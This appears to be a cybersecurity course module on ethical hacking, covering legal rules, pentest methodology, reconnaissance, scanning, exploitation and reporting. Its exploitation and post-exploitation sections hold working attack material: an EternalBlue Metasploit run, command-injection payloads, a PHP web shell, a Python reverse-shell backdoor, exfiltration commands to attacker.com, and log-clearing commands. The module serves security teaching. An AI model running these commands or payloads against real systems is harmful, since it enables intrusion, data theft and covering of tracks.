# Module 5: Ethical Hacking

## 📌 Module Overview

Ethical hacking, also known as penetration testing, involves authorized attempts to gain unauthorized access to systems to identify vulnerabilities. This module covers the methodology, tools, and techniques used by ethical hackers to improve security.

## 🎯 Learning Objectives

After completing this module, you will be able to:
- Understand ethical hacking principles and legal considerations
- Follow a structured penetration testing methodology
- Perform reconnaissance and information gathering
- Conduct vulnerability scanning and analysis
- Execute basic exploitation techniques
- Document and report findings professionally

## ⚖️ Legal and Ethical Considerations

### **Golden Rules of Ethical Hacking**

1. **Always Get Written Authorization**
   - Never test without explicit permission
   - Define scope clearly
   - Get signed agreements

2. **Stay Within Scope**
   - Only test authorized systems
   - Respect boundaries
   - Stop if you accidentally access out-of-scope systems

3. **Do No Harm**
   - Don't damage systems
   - Don't delete or modify data
   - Minimize disruption

4. **Maintain Confidentiality**
   - Protect client information
   - Secure your findings
   - Follow NDA agreements

5. **Report Everything**
   - Document all findings
   - Include failed attempts
   - Provide remediation guidance

## 📖 Content

### 1. Penetration Testing Methodology

#### **Industry Standard Frameworks**

**1. PTES (Penetration Testing Execution Standard)**
- Pre-engagement Interactions
- Intelligence Gathering
- Threat Modeling
- Vulnerability Analysis
- Exploitation
- Post Exploitation
- Reporting

**2. OWASP Testing Guide**
- Information Gathering
- Configuration Management Testing
- Identity Management Testing
- Authentication Testing
- Authorization Testing
- Session Management Testing
- Data Validation Testing

**3. MITRE ATT&CK Framework**
- Tactics (what attackers want)
- Techniques (how they do it)
- Procedures (specific implementations)

### 2. Information Gathering (Reconnaissance)

#### **Passive Reconnaissance**
Gathering information without directly interacting with the target.

**1. OSINT (Open Source Intelligence)**
```bash
# Google Dorking examples
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
"@example.com" -site:example.com

# Shodan queries
hostname:example.com
org:"Example Company"
net:192.168.1.0/24
```

**2. DNS Reconnaissance**
```bash
# DNS enumeration
dnsrecon -d example.com
dnsenum example.com

# Subdomain enumeration
sublist3r -d example.com
amass enum -d example.com

# DNS zone transfer attempt
dig axfr @ns1.example.com example.com
```

**3. Social Media Intelligence**
```python
# Example: LinkedIn reconnaissance script
import requests
from bs4 import BeautifulSoup

def gather_employees(company_name):
    # This is a conceptual example - respect rate limits and ToS
    search_url = f"https://www.linkedin.com/search/results/people/?keywords={company_name}"
    # In practice, use LinkedIn API with proper authentication
```

**4. Metadata Analysis**
```bash
# Extract metadata from documents
exiftool document.pdf
metagoofil -d example.com -t pdf,doc,xls -l 100 -o results
```

#### **Active Reconnaissance**

**1. Network Scanning**
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sS -sV -O target.com
nmap -p- -T4 target.com

# Service enumeration
nmap -sV -sC -p 22,80,443 target.com

# UDP scanning
nmap -sU -top-ports 1000 target.com
```

**2. Web Application Scanning**
```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
dirbuster -u http://target.com -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Technology identification
whatweb http://target.com
wappalyzer http://target.com
```

### 3. Vulnerability Scanning

#### **Automated Vulnerability Scanners**

**1. Network Vulnerability Scanning**
```bash
# OpenVAS
openvas-setup
openvas-start
# Access web interface at https://localhost:9392

# Nessus (commercial)
# Configure and run through web interface

# Vulnerability scripts with Nmap
nmap --script vuln target.com
```

**2. Web Application Vulnerability Scanning**
```bash
# OWASP ZAP
zap.sh -daemon -host 0.0.0.0 -port 8080
# Use ZAP API or GUI for scanning

# Nikto
nikto -h http://target.com

# SQLMap for SQL injection
sqlmap -u "http://target.com/page.php?id=1" --batch --risk=3 --level=5
```

#### **Manual Vulnerability Assessment**

**1. Configuration Issues**
```python
# Check for default credentials
default_creds = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('root', 'toor'),
    ('guest', 'guest')
]

def check_default_creds(url, creds_list):
    for username, password in creds_list:
        response = requests.post(
            f"{url}/login",
            data={'username': username, 'password': password}
        )
        if "dashboard" in response.url:
            print(f"Default credentials found: {username}:{password}")
```

**2. SSL/TLS Testing**
```bash
# Test SSL configuration
sslscan target.com
testssl.sh target.com

# Check for weak ciphers
nmap --script ssl-enum-ciphers -p 443 target.com
```

### 4. Exploitation

#### **Metasploit Framework**

**Basic Metasploit Usage**
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

**Meterpreter Commands**
```bash
# System information
sysinfo
getuid
ps

# Privilege escalation
getsystem
hashdump

# Persistence
run persistence -h

# Pivoting
run autoroute -s 10.10.10.0/24
```

#### **Web Application Exploitation**

**1. SQL Injection Exploitation**
```python
# Manual SQL injection example
import requests

def extract_data(url):
    # Extract database name
    payload = "' UNION SELECT 1,database(),3-- "
    response = requests.get(url + payload)
    
    # Extract tables
    payload = "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- "
    response = requests.get(url + payload)
    
    # Extract columns
    payload = "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- "
    response = requests.get(url + payload)
```

**2. Command Injection**
```bash
# Common command injection payloads
; ls -la
| whoami
&& cat /etc/passwd
`id`
$(cat /etc/passwd)
```

**3. File Upload Exploitation**
```php
# PHP web shell
<?php system($_GET['cmd']); ?>

# Access: http://target.com/uploads/shell.php?cmd=whoami
```

#### **Password Attacks**

**1. Online Password Attacks**
```bash
# Hydra for brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Medusa for various protocols
medusa -h target.com -u admin -P passwords.txt -M ssh
```

**2. Offline Password Cracking**
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# Hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 ntlm_hashes.txt wordlist.txt
```

### 5. Post-Exploitation

#### **Maintaining Access**
```python
# Simple Python backdoor (educational purposes only)
import socket
import subprocess
import os

def backdoor():
    host = '192.168.1.50'  # Attacker's IP
    port = 4444
    
    s = socket.socket()
    s.connect((host, port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    
    s.close()
```

#### **Data Exfiltration**
```bash
# Various exfiltration methods
# DNS exfiltration
cat sensitive_file | xxd -p | while read line; do nslookup $line.attacker.com; done

# HTTP exfiltration
curl -X POST -d @sensitive_file http://attacker.com/upload

# Encrypted exfiltration
tar czf - /sensitive/data | openssl enc -aes-256-cbc -pass pass:secret | curl -X POST --data-binary @- http://attacker.com/
```

#### **Covering Tracks**
```bash
# Clear Linux logs (don't do this on real systems!)
echo > /var/log/auth.log
history -c
unset HISTFILE

# Windows event log clearing
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

### 6. Reporting

#### **Penetration Test Report Structure**

**1. Executive Summary**
- High-level overview
- Business impact
- Risk ratings
- Key recommendations

**2. Technical Summary**
- Scope and methodology
- Tools used
- Timeline
- Limitations

**3. Findings**
```markdown
## Finding: SQL Injection in Login Form

**Severity**: Critical
**CVSS Score**: 9.8

**Description**: 
The login form at /login.php is vulnerable to SQL injection attacks. An attacker can bypass authentication and access the database.

**Impact**:
- Unauthorized access to all user accounts
- Data theft and manipulation
- Complete system compromise

**Proof of Concept**:
```sql
Username: admin' OR '1'='1'-- 
Password: anything
```

**Remediation**:
1. Use parameterized queries
2. Implement input validation
3. Apply principle of least privilege to database user

**References**:
- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89: SQL Injection
```

**4. Remediation Roadmap**
- Priority matrix
- Quick wins
- Long-term improvements
- Security program recommendations

### 7. Ethical Hacking Tools Overview

#### **Essential Tool Categories**

**1. Information Gathering**
- theHarvester
- Maltego
- Recon-ng
- SpiderFoot

**2. Scanning**
- Nmap
- Masscan
- Zmap
- Unicornscan

**3. Web Testing**
- Burp Suite
- OWASP ZAP
- SQLMap
- XSSer

**4. Exploitation**
- Metasploit
- BeEF
- Empire
- Cobalt Strike

**5. Password Testing**
- John the Ripper
- Hashcat
- Hydra
- Medusa

**6. Wireless Testing**
- Aircrack-ng
- Kismet
- Wifite
- Reaver

### 8. Building a Home Lab

#### **Virtual Lab Setup**
```bash
# Install VirtualBox or VMware
# Download vulnerable VMs:
# - Metasploitable 2/3
# - DVWA (Damn Vulnerable Web Application)
# - VulnHub machines
# - HackTheBox (online platform)
# - TryHackMe (online platform)

# Network configuration
# Create isolated network for testing
# Use NAT or Host-only networking
# Never expose vulnerable VMs to internet
```

#### **Lab Exercises**
1. **Basic Enumeration**: Scan and map a network
2. **Web App Testing**: Find vulnerabilities in DVWA
3. **Exploitation**: Compromise Metasploitable
4. **Privilege Escalation**: Escalate from user to root
5. **Report Writing**: Document your findings

## 🛠️ Practical Exercises

1. **Reconnaissance Challenge**: Gather information about a target company (with permission)
2. **Vulnerability Assessment**: Scan and identify vulnerabilities in a test environment
3. **Exploitation Lab**: Exploit common vulnerabilities in controlled environment
4. **CTF Practice**: Participate in Capture The Flag competitions
5. **Report Writing**: Create professional penetration test report

## 💡 Key Takeaways

1. Always operate ethically and legally
2. Follow a structured methodology
3. Document everything thoroughly
4. Think like an attacker, act like a professional
5. Continuous learning is essential
6. The goal is to improve security, not to cause harm

## 🔗 Additional Resources

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [SANS Penetration Testing](https://www.sans.org/cyber-security-courses/penetration-testing/)
- [Offensive Security Training](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.eu/)
- [TryHackMe](https://tryhackme.com/)

## ✅ Module Quiz

1. What are the main phases of penetration testing methodology?
2. What's the difference between passive and active reconnaissance?
3. Explain the importance of staying within scope during a pentest
4. What tools would you use for web application vulnerability scanning?
5. How do you properly document and report security findings?

## 🎓 Course Completion

Congratulations on completing the Cybersecurity Fundamentals course! You now have a solid foundation in:
- Security principles and concepts
- Network and web application security
- Cryptography
- Ethical hacking techniques

### Next Steps:
- Practice in virtual labs
- Pursue certifications (CompTIA Security+, CEH, OSCP)
- Join cybersecurity communities
- Stay updated with latest threats and defenses
- Consider specializing in a specific area

---

*Remember: With great power comes great responsibility. Use your skills ethically and legally!* 